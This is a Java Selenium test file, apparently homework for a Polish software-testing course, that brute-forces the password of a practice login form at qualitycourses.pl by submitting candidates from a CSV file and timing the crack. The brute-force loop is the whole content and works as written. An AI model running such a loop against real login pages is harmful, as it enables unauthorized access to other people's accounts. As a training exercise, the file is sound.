package homework;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.openqa.selenium.Alert;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;

/*
 * Zad.4.
 * Stwórz program, który użyje brute force'a w celu odgadnięcia hasła do formularza http://qualitycourses.pl/login (login: testy123).
 * Podejrzałeś przez ramię jak kolega wpisuje hasło, natomiast po wprowadzeniu pierszych czterech znaków, kolega się pochylił zasłaniając klawiaturę.
 * Wiesz natomiast, że pierwsze znaki to "test". Wypisz na ekran informację ile czasu zajęło "złamanie" hasła.
 */
public class BruteForce {

    private WebDriver driver;

    @BeforeEach
    void setUp() {
        driver = new ChromeDriver();
    }

    /*@AfterEach
    void tearDown() {
        driver.quit();
    }*/

    @Test
    void test() throws IOException {
        driver.get("http://qualitycourses.pl/login");
        String login = "testy123";
        String loginOk = "";

        File file = new File("c:/passwords.csv");
        BufferedReader reader = new BufferedReader(new FileReader(file));

        WebElement usernameInput = driver.findElement(By.xpath("//input[@name='userid']"));
        WebElement passwordInput = driver.findElement(By.xpath("//input[@name='pwd']"));
        WebElement submit = driver.findElement(By.xpath("//input[@type='submit']"));

        long startTime = System.currentTimeMillis();
        String crackedPass = "";
        usernameInput.sendKeys("testy123");

        while (!loginOk.equals("Success")) {
            crackedPass = reader.readLine();
            passwordInput.sendKeys(crackedPass);
            submit.click();
            WebDriverWait wait = new WebDriverWait(driver, 5);
            wait.until(ExpectedConditions.alertIsPresent());
            Alert alert = driver.switchTo().alert();
            loginOk = alert.getText();
            alert.accept();
            passwordInput.clear();
        }

        long stopTime = System.currentTimeMillis();
        long elapsedTime = stopTime - startTime;
        System.out.println("Cracked password: " + crackedPass);
        System.out.println("Password was cracked in " + elapsedTime / 1000 + "." + elapsedTime % 1000 + " seconds");
    }
}
